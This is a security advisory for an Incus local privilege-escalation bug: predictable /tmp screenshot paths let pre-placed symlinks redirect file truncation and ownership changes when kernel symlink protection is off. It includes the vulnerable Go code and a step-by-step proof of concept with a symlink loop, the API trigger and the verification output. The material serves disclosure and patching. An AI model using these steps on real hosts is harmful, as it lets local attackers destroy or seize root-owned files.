summary: "Incus vulnerable to local privilege escalation through VM screenshot path\n### Summary\n\
  Incus provides an API to retrieve VM screenshots, that API relies on the use of a temporary\
  \ file for QEMU to write the screenshot to which is then picked up and sent to the user prior\
  \ to deletion.\n\nAs Incus uses predictable paths under /tmp for this, an attacker with local\
  \ access to the system can abuse this mechanism by creating their own symlinks ahead of time.\n\
  \nOn the vast majority of Linux systems, this will result in a \"Permission denied\" error\
  \ when requesting a screenshot. That's because the Linux kernel has a security feature designed\
  \ to block such attacks, `protected_symlinks`.\n\nOn the rare systems with this purposefully\
  \ disabled, it's then possible to trick Incus intro truncating and altering the mode and permissions\
  \ of arbitrary files on the filesystem, leading to a potential denial of service or possible\
  \ local privilege escalation.\n\n### Details\nThe incusd daemon contains a local privilege\
  \ escalation (LPE) primitive in the Virtual Machine VGA screenshot handling routine. When\
  \ a screenshot is requested, the daemon creates a file in the globally writable /tmp directory\
  \ using a deterministic pathname derived from the instance identifier. Because this implementation\
  \ uses a predictable pathname in a world-writable directory, it exposes the operation to pathname\
  \ attacks. The file permissions are then restricted, and the file is passed to the QEMU screenshot\
  \ routine. In the QEMU path, ownership is transferred to the unprivileged Virtual Machine\
  \ UID before the QEMU Machine Protocol is invoked with the same pathname.\n\nAn attacker able\
  \ to pre-place or otherwise control that pathname can redirect truncation and ownership changes\
  \ to an unintended host file.\n\nThis allows attacker-chosen host files to be truncated and\
  \ have ownership reassigned to the unprivileged VM UID. In practice, this can be used to destroy\
  \ sensitive root-owned files and alter ownership of security-relevant host paths. Depending\
  \ on the targeted path and follow-up conditions, the impact may include denial of service,\
  \ corruption of credentials or configuration, persistence through modified startup or service\
  \ files, and further privilege escalation on the host.\n\nAs previously mentioned, this is\
  \ only possible if the kernel protection mechanism has been previously disabled.\nIt's possible\
  \ to check on its status by reading the file at `/proc/sys/fs/protected_symlinks`, a value\
  \ of 0 is required for this attack to work.\n\nAffected File:\nhttps://github.com/lxc/incus/blob/v6.20.0/cmd/incusd/instance_console.go\
  \ \n\nAffected Code:\n```go\nfunc instanceConsoleGet(d *Daemon, r *http.Request) response.Response\
  \ {\n    [...]\n    } else if inst.Type() == instancetype.VM {\n        v, ok := inst.(instance.VM)\n\
  \        if !ok {\n            return response.SmartError(errors.New(\"Failed to cast inst\
  \ to VM\"))\n        }\n\n        var headers map[string]string\n        if consoleLogType\
  \ == \"vga\" {\n            screenshotFile, err := os.Create(fmt.Sprintf(\"/tmp/incus_screenshot_%d\"\
  , inst.ID()))\n            if err != nil {\n                return response.SmartError(fmt.Errorf(\"\
  Couldn't create screenshot file: %w\", err))\n            }\n\n            err = screenshotFile.Chmod(0o600)\n\
  \            if err != nil {\n                return response.SmartError(err)\n          \
  \  }\n\n            ent.Cleanup = func() {\n                _ = screenshotFile.Close()\n \
  \               _ = os.Remove(screenshotFile.Name())\n            }\n\n            err = v.ConsoleScreenshot(screenshotFile)\n\
  \            if err != nil {\n                return response.SmartError(err)\n          \
  \  }\n            [...]\n    }\n    [...]\n}\n```\n\nAffected File:\nhttps://github.com/lxc/incus/blob/v6.20.0/internal/server/instance/drivers/driver_qemu.go\
  \ \n\nAffected Code:\n```go\nfunc (d *qemu) ConsoleScreenshot(screenshotFile *os.File) error\
  \ {\n    if !d.IsRunning() {\n        return errors.New(\"Instance is not running\")\n   \
  \ }\n\n\n    // Check if the agent is running.\n    monitor, err := d.qmpConnect()\n    if\
  \ err != nil {\n        return err\n    }\n\n    err = screenshotFile.Chown(int(d.state.OS.UnprivUID),\
  \ -1)\n    if err != nil {\n        return fmt.Errorf(\"Failed to chown screenshot path: %w\"\
  , err)\n    }\n\n\n    // Take the screenshot.\n    err = monitor.Screendump(screenshotFile.Name())\n\
  \    if err != nil {\n        return fmt.Errorf(\"Failed taking screenshot: %w\", err)\n \
  \   }\n\n    return nil\n}\n```\n\n### PoC\nThe following PoC demonstrates that a local attacker\
  \ can pre-place symlink traps in the predictable /tmp/incus_screenshot_<ID> namespace and\
  \ coerce the root incusd daemon into truncating an unintended host file and reassigning its\
  \ ownership during a VM VGA screenshot request.\n\nStep 0: Disable the kernel symlink protection\
  \ mechanism\n\nCommands (as root):\n```\necho 0 > /proc/sys/fs/protected_symlinks\n```\n\n\
  Step 1: Prepare the target VM\n\nFrom an Incus client with access to the target server, ensure\
  \ a running virtual machine exists that can service the VGA screenshot path.\n\nCommands:\n\
  ```\nincus init images:alpine/edge lpe-vm --vm --project default\nincus config set lpe-vm\
  \ security.secureboot=false --project default\nincus start lpe-vm --project default\n```\n\
  \nStep 2: Create a root-owned trap target and pre-place /tmp symlinks\n\nOn the Incus host,\
  \ create a sensitive root-owned file and place symlinks across a range of likely screenshot\
  \ identifiers so that the predictable daemon pathname resolves to the chosen host target.\n\
  \nCommands:\n```\necho \"SuperSecretRootHash\" > /root/shadow_trap\nchmod 600 /root/shadow_trap\n\
  ls -l /root/shadow_trap\n\n\nfor i in $(seq 1 100); do\n    ln -sf /root/shadow_trap /tmp/incus_screenshot_$i\n\
  done\n\nls -l /tmp/incus_screenshot_* | head\n```\n\nResult:\n```\n-rw------- 1 root root\
  \ 20 Mar 18 00:27 /root/shadow_trap\n```\n\nStep 3: Trigger the vulnerable screenshot path\n\
  \nFrom an Incus client with access to the target server, request the VM VGA console through\
  \ the Incus API. This causes the daemon to open the predictable /tmp/incus_screenshot_<ID>\
  \ path, change its ownership, and pass the same pathname into the QEMU screendump flow.\n\n\
  \nCommand:\n```\nincus query -X GET \"/1.0/instances/lpe-vm/console?project=default&type=vga\"\
  \ > /dev/null\n```\n\nResult:\n```\nError: Failed taking screenshot: Failed to connect to\
  \ QEMU monitor\n```\n\nStep 4: Verify host-side impact\n\nOn the Incus host, inspect the previously\
  \ root-owned target file and confirm that it has been truncated and that ownership has been\
  \ reassigned to the unprivileged VM UID.\n\nCommand:\n```\nls -l /root/shadow_trap && stat\
  \ /root/shadow_trap\n```\n\nResult:\n```\n-rw------- 1 incus root 0 Mar 18 00:29 /root/shadow_trap\n\
  \  File: /root/shadow_trap\n  Size: 0\n  Access: (0600/-rw-------)\n  Uid: ( 100000/   incus)\n\
  \  Gid: (     0/    root)\n```\n\nIt is recommended to create the temporary file securely\
  \ in a directory controlled exclusively by the daemon, avoid predictable /tmp paths, and avoid\
  \ reusing a mutable pathname after file creation.\n\n### Credit\nThis issue was discovered\
  \ and reported by the team at 7asecurity (https://7asecurity.com/)"
